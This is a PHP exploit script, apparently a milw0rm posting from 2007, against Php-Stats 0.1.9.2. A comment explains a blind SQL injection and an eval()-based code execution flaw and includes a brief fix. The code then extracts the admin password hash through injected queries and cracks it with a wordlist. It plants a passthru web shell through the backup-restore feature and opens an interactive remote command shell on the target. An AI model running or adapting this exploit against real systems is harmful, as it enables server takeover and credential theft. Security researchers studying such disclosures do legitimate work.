<?php

/*
	Php-Stats 0.1.9.2 Multiple Vulnerabilities Exploit
	Blind SQL Injection / Remote Code Execution P.o.C.
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://php-stats.com/downloads
	details..: works with magic_quotes_runtime = off

	[1] Blind SQL Injection in php-stats.recjs.php:

        94.	if(isset($_GET['ip'])) $ip=urldecode($_GET['ip']); else break;
        95.	if(!ereg('^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$',long2ip($ip))) break; [*]
        97.
        98.	if(isset($_GET['visitor_id'])) $visitor_id=strtolower(urldecode($_GET['visitor_id'])); else break;
        99.	if((!eregi('^[0-9,a-z]{32}',$visitor_id)) && (strlen($visitor_id)<>32)) break;
        100.
        103.	$title='?';
        104.	if($option['page_title'] && isset($_GET['t']))
        105.	 {
        106.	 $tmpTitle=htmlspecialchars(addslashes(urldecode($_GET['t']))); [**]
        107.	 if($tmpTitle!='\\\\\\&quot; t \\\\\\&quot;') $title=$tmpTitle;
        108.	 }
	109.
        174.	if (($loaded=='?') && ($title!='?')) {
        175.	  $result=sql_query("SELECT lastpage FROM $option[prefix]_cache WHERE user_id='$ip' AND visitor_id='$visitor_id' LIMIT 1");
        176.	  if(mysql_affected_rows()>0) {
        177.	    list($loaded)=mysql_fetch_row($result);
        178.	    $appendDetails="AND currentPage='$loaded'";
        179.	  }
        180.	}
        181.
        183.	if(($modulo[3]) && ($title!=''))
        184.	  sql_query("UPDATE $option[prefix]_pages SET titlePage='$title' WHERE data='$loaded' $append"); [***]

	the long2ip() function [*] converts his numeric argument to an IPv4 dotted ip...if you try this: long2ip(-1)
	the result is 255.255.255.255, but if the argument is -1' OR 1=1/* the result is the same, so you can handle
	$_GET[ip] parameter to inject sql into the query at line 175, also, this argument is passed to urldecode(), so
	you can bypass magic_quotes_gpc by escaping ' with %2527...to see the results of blind sql injection you can edit
	the value of 'titlePage' record in the _pages table with $_GET[t] [**] by injecting other sql in the WHERE clause
	at line 184 [***] so, by seeing results through /admin.php?action=pages you can retrive admin password hash...but 
	this is stored into db as sha1(sha1(pass)), while cookie's password for automatic login is stored as sha1(pass)...
	so you can only try dictionary or bruteforce attack to retrive the plain text of the sha1 hash for the cookie!

	[2] Remote Code Execution in admin.php (also click.php, download.php, and so many files...):

	127.	if($NowritableServer===1){
	129.	  $result=sql_query("SELECT option_name,option_value FROM $option[prefix]_options");
	130.	  while($row=mysql_fetch_row($result)) $option[$row[0]]=$row[1];
	131.	  eval($option['php-stats-options']);
	132.	  }

	if $NowritableServe is set to 1, $option['php-stats-options'] is passed to eval()...you can change the server write
	modality to set $NowritableServer and to create _options table (see lines 42-68), also, with admin rights, you can store
	any value into 'php-stats-options' record through backup utility for ex. (/admin.php?action=backup&mode=restore)...
	so you can inject malicious php code into 'php-stats-options' record of  _options table and execute it through eval()
	
	[-] Bug Fix in php-stats.recjs.php:
	
	replace this line:	94.	if(isset($_GET['ip'])) $ip=urldecode($_GET['ip']); else break;
	with this:		94.	if(isset($_GET['ip'])) $ip=intval(urldecode($_GET['ip'])); else break;
*/

error_reporting(0);
ini_set("default_socket_timeout",5);
set_time_limit(0);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80); $c = 0;
	while (!$sock)
	{
		if ($c++ == 10) die();
		print "\n[-] No response from ".$host.":80 Trying again...";
		$sock = fsockopen($host,80);
		sleep(1);
	}
	fputs($sock, $packet);
	$resp = "";
	while (!feof($sock)) $resp .= fread($sock, 1);
	fclose($sock);
	return $resp;
}

function check_query($key)
{
	global $host, $path;
	
	$pck  = "GET {$path}admin.php?action=pages HTTP/1.1\r\n";
	$pck .= "Host: {$host}\r\n";
	$pck .= "Keep-Alive: 300\r\n";
	$pck .= "Connection: keep-alive\r\n\r\n";
	$html = http_send($host, $pck);
	
	return (preg_match($key, $html) ? true : false);
}

function set_table()
{
	global $host, $path, $prefix;
	
	// insert a record into _pages table...
	$pck  = "GET {$path}php-stats.recphp.php HTTP/1.1\r\n";
	$pck .= "Host: {$host}\r\n";
	$pck .= "Keep-Alive: 300\r\n";
	$pck .= "Connection: keep-alive\r\n\r\n";
	http_send($host, $pck);
	// ...and try to inject sql
	$sql  = "-1' UNION SELECT CONCAT(CHAR(39),' OR 1=1',CHAR(47),CHAR(42)) FROM {$prefix}_config WHERE name='admin_pass'/*";
	$sql  = str_replace("%27", "%2527", urlencode($sql));
	$get  = "visitor_id=acbd18db4cc2f85cedef654fccc4a4d8";
	$get .= "&t=_default_value_";
	$get .= "&ip={$sql}";
	$pck  = "GET {$path}php-stats.recjs.php?{$get} HTTP/1.1\r\n";
	$pck .= "Host: {$host}\r\n";
	$pck .= "Keep-Alive: 300\r\n";
	$pck .= "Connection: keep-alive\r\n\r\n";
	$html = http_send($host, $pck);
	
	if (!check_query("/_default_value_/")) die("\n[-] Exploit failed...probably magic_quotes_runtime = on\n");
}

function set_NowritableServer()
{
	global $host, $path, $prefix, $pwd;
	
	// we need to set $NowritableServer=1 in /option/php-stats_mode.php
	$s1   = "/con scrittura di files sul Server/";
	$s2   = "/the write files on server mode/";
	$pck  = "GET {$path}admin.php?action=preferenze HTTP/1.1\r\n";
	$pck .= "Host: {$host}\r\n";
	$pck .= "Cookie: pass_cookie={$pwd}\r\n";
	$pck .= "Keep-Alive: 300\r\n";
	$pck .= "Connection: keep-alive\r\n\r\n";	
	$html = http_send($host, $pck);
	if (preg_match($s1, $html) || preg_match($s2, $html))
	{
		$data = "change_mode=1";
		$pck  = "POST {$path}admin.php HTTP/1.1\r\n";
		$pck .= "Host: {$host}\r\n";
		$pck .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$pck .= "Content-Length: ".strlen($data)."\r\n";
		$pck .= "Keep-Alive: 300\r\n";
		$pck .= "Connection: keep-alive\r\n\r\n";
		$pck .= $data;
		http_send($host, $pck);
	}
}

print "\n+------------------------------------------------------------+";
print "\n| Php-Stats 0.1.9.2 Multiple Vulnerabilities Exploit by EgiX |";
print "\n+------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......:	php $argv[0] host path [options]\n";
	print "\nhost.......:	target server (ip/hostname)";
	print "\npath.......:	path to Php-Stats directory (example: / or /php-stats/)\n";
	print "\n-h hash....:	SHA1 hash stored into db (to find with sql injection)";
	print "\n-p pass....:	admin's password plain text (the cracked password)";
	print "\n-t prefix..:	table's prefix (default: php_stats)\n";
	die();
}

$opt	= array("-h","-p","-t");
$host	= $argv[1];
$path	= $argv[2];
$sha	= "";
$pwd	= "";
$prefix = "php_stats";

for ($i = 3; $i < $argc; $i++)
{
	if ($argv[$i] == "-h") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $sha = $argv[++$i];
	if ($argv[$i] == "-p") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $pwd = $argv[++$i];
	if ($argv[$i] == "-t") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $prefix = $argv[++$i];	
}

if (strlen($sha) < 40 && strlen($pwd) == 0)
{
  set_table();
  
  $hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
  $pos = strlen($sha) + 1; $arLen = count($hash);
  print "\n[-] SHA1 hash: {$sha}";
  
  while (!strpos($sha, chr(0)))
  {
	for ($i = 0; $i <= $arLen; $i++)
	{
  		if ($i == $arLen) die("\n[-] Exploit failed...\n");
		
		$sql = "-1' UNION SELECT CONCAT(CHAR(39),' OR {$hash[$i]}=',ORD(SUBSTR(value,{$pos},1)),CHAR(47),CHAR(42)) FROM {$prefix}_config WHERE name='admin_pass'/*";
		$sql = str_replace("%27", "%2527", urlencode($sql));
		$get = "visitor_id=acbd18db4cc2f85cedef654fccc4a4d8";
		$get.= "&t=_my_flag_{$pos}";
		$get.= "&ip={$sql}";
		$pck = "GET {$path}php-stats.recjs.php?{$get} HTTP/1.1\r\n";
		$pck.= "Host: {$host}\r\n";
		$pck.= "Keep-Alive: 300\r\n";
		$pck.= "Connection: keep-alive\r\n\r\n";
		http_send($host, $pck);
		
		if (check_query("/_my_flag_{$pos}/")) { $sha .= chr($hash[$i]); print chr($hash[$i]); break; }
	}
	
	$pos++;
  }
}

$sha = trim($sha);
if (strlen($sha) > 0 && !eregi("[0-9,a-f]{40}", $sha)) die("\n[-] Invalid SHA1 hash...\n");

if (strlen($pwd) == 0)
{
	// simple dictionary attack
	print "\n\n[-] Trying dictionary attack using wordlist.txt...\n";
	if (!file_exists("wordlist.txt")) die("\n[-] wordlist.txt not found!\n");
	$words = file("wordlist.txt");
	$arLen = count($words);

	for ($i = 0; $i <= $arLen; $i++)
	{
		if ($i == $arLen) die("\n\n[-] Dictionary attack failed...\n");
		$word = trim($words[$i]);
		$test_hash = sha1(sha1($word));
		print "\n[-] Testing {$word}: {$test_hash}";
		if ($test_hash == $sha) { $pwd = $word; break; }
	}
}

print "\n\n[-] Admin's password: {$pwd}"; $pwd = sha1($pwd);
print "\n[-] Cookies password: {$pwd}\n\n[-] Starting the shell...\n";

set_NowritableServer();
   
// inject php shell into 'php-stats-options' record of  _options table through the backup script...
$code = "error_reporting(0);echo 12345;passthru(base64_decode(\$_SERVER[HTTP_CMD]));echo 12345;die;";
$data = "--12345\r\n";
$data.= "Content-Disposition: form-data; name=\"backup_php_stats\"; filename=\"backup.sql\"\r\n";
$data.= "Content-Type: application/octet-stream\r\n\r\n";
$data.= "# Dump code: 4039ca1a891c85f867b40b0217042be8\n"; // md5("code:0.1.9.2");
$data.= "UPDATE {$prefix}_options SET option_value='{$code}' WHERE option_name='php-stats-options'\r\n";
$data.= "--12345--\r\n";

$pck  = "POST {$path}admin.php?action=backup&mode=restore HTTP/1.1\r\n";
$pck .= "Host: {$host}\r\n";
$pck .= "Cookie: pass_cookie={$pwd}\r\n";
$pck .= "Content-Type: multipart/form-data; boundary=12345\r\n";
$pck .= "Content-Length: ".strlen($data)."\r\n";
$pck .= "Keep-Alive: 300\r\n";
$pck .= "Connection: keep-alive\r\n\r\n";
$pck .= $data;

http_send($host, $pck);

// ...and finally start the shell!
define(STDIN, fopen("php://stdin", "r"));
while(1)
{
	print "\nxpl0t-sh3ll # ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$pck  = "GET {$path}admin.php HTTP/1.1\r\n";
		$pck .= "Host: {$host}\r\n";
		$pck .= "Cmd: ".base64_encode($cmd)."\r\n";
		$pck .= "Keep-Alive: 300\r\n";
		$pck .= "Connection: keep-alive\r\n\r\n";
		$resp = http_send($host, $pck);
		if (!strpos($resp, "12345")) die("\n[-] Exploit failed...\n");
		$shell = explode("12345", $resp);
		print "\n".$shell[1];
	}
	else break;
}

?>

# milw0rm.com [2007-10-10]
